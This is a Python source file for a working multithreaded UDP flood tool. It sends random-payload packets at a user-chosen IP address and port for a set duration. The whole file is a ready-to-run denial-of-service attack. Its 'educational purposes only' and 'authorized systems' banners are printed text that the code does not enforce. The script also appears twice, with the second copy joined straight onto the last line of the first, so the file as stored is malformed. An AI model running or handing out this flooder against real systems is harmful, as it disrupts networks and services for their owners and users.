import socket
import random
import time
import sys
import argparse
from threading import Thread, Event

# ANSI colors for warnings
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RESET = "\033[0m"

def print_banner():
    print(f"{RED}╔════════════════════════════════════════════╗")
    print(f"║{' '*16}{YELLOW}UDP FLOOD TEST TOOL{' '*16}{RED}║")
    print(f"║{' '*5}{RESET}FOR EDUCATIONAL PURPOSES ONLY{' '*5}{RED}║")
    print(f"╚════════════════════════════════════════════╝{RESET}\n")

def udp_flood(target_ip, target_port, duration, packet_size=1024, max_threads=5):
    """
    Sends UDP packets to a target (for testing networks you own).
    """
    if not validate_ip(target_ip):
        print(f"{RED}[!] Invalid IP address{RESET}")
        return

    print(f"{YELLOW}[!] WARNING: Use only on authorized systems!{RESET}")
    print(f"{GREEN}[*] Target: {target_ip}:{target_port}")
    print(f"[*] Duration: {duration} seconds")
    print(f"[*] Packet size: {packet_size} bytes{RESET}\n")

    stop_event = Event()
    threads = []

    try:
        for _ in range(max_threads):
            thread = Thread(target=send_packets, args=(target_ip, target_port, packet_size, stop_event))
            thread.daemon = True
            thread.start()
            threads.append(thread)

        time.sleep(duration)
        stop_event.set()

        for thread in threads:
            thread.join()

    except KeyboardInterrupt:
        print(f"\n{RED}[!] Stopped by user{RESET}")
        stop_event.set()

def send_packets(target_ip, target_port, packet_size, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet_count = 0

    while not stop_event.is_set():
        try:
            payload = random._urandom(packet_size)
            sock.sendto(payload, (target_ip, target_port))
            packet_count += 1
        except Exception as e:
            print(f"{RED}[!] Error: {e}{RESET}")
            break

    sock.close()

def validate_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

if __name__ == "__main__":
    print_banner()
    
    parser = argparse.ArgumentParser(description="UDP Flood Tester (Educational Use Only)")
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument("target_port", type=int, help="Target port")
    parser.add_argument("duration", type=int, help="Attack duration in seconds")
    parser.add_argument("--size", type=int, default=1024, help="Packet size in bytes (default: 1024)")
    parser.add_argument("--threads", type=int, default=5, help="Thread count (default: 5)")

    args = parser.parse_args()

    if args.duration <= 0:
        print(f"{RED}[!] Duration must be > 0{RESET}")
        sys.exit(1)

    udp_flood(args.target_ip, args.target_port, args.duration, args.size, args.threads)import socket
import random
import time
import sys
import argparse
from threading import Thread, Event

# ANSI colors for warnings
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RESET = "\033[0m"

def print_banner():
    print(f"{RED}╔════════════════════════════════════════════╗")
    print(f"║{' '*16}{YELLOW}UDP FLOOD TEST TOOL{' '*16}{RED}║")
    print(f"║{' '*5}{RESET}FOR EDUCATIONAL PURPOSES ONLY{' '*5}{RED}║")
    print(f"╚════════════════════════════════════════════╝{RESET}\n")

def udp_flood(target_ip, target_port, duration, packet_size=1024, max_threads=5):
    """
    Sends UDP packets to a target (for testing networks you own).
    """
    if not validate_ip(target_ip):
        print(f"{RED}[!] Invalid IP address{RESET}")
        return

    print(f"{YELLOW}[!] WARNING: Use only on authorized systems!{RESET}")
    print(f"{GREEN}[*] Target: {target_ip}:{target_port}")
    print(f"[*] Duration: {duration} seconds")
    print(f"[*] Packet size: {packet_size} bytes{RESET}\n")

    stop_event = Event()
    threads = []

    try:
        for _ in range(max_threads):
            thread = Thread(target=send_packets, args=(target_ip, target_port, packet_size, stop_event))
            thread.daemon = True
            thread.start()
            threads.append(thread)

        time.sleep(duration)
        stop_event.set()

        for thread in threads:
            thread.join()

    except KeyboardInterrupt:
        print(f"\n{RED}[!] Stopped by user{RESET}")
        stop_event.set()

def send_packets(target_ip, target_port, packet_size, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet_count = 0

    while not stop_event.is_set():
        try:
            payload = random._urandom(packet_size)
            sock.sendto(payload, (target_ip, target_port))
            packet_count += 1
        except Exception as e:
            print(f"{RED}[!] Error: {e}{RESET}")
            break

    sock.close()

def validate_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

if __name__ == "__main__":
    print_banner()
    
    parser = argparse.ArgumentParser(description="UDP Flood Tester (Educational Use Only)")
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument("target_port", type=int, help="Target port")
    parser.add_argument("duration", type=int, help="Attack duration in seconds")
    parser.add_argument("--size", type=int, default=1024, help="Packet size in bytes (default: 1024)")
    parser.add_argument("--threads", type=int, default=5, help="Thread count (default: 5)")

    args = parser.parse_args()

    if args.duration <= 0:
        print(f"{RED}[!] Duration must be > 0{RESET}")
        sys.exit(1)

    udp_flood(args.target_ip, args.target_port, args.duration, args.size, args.threads)
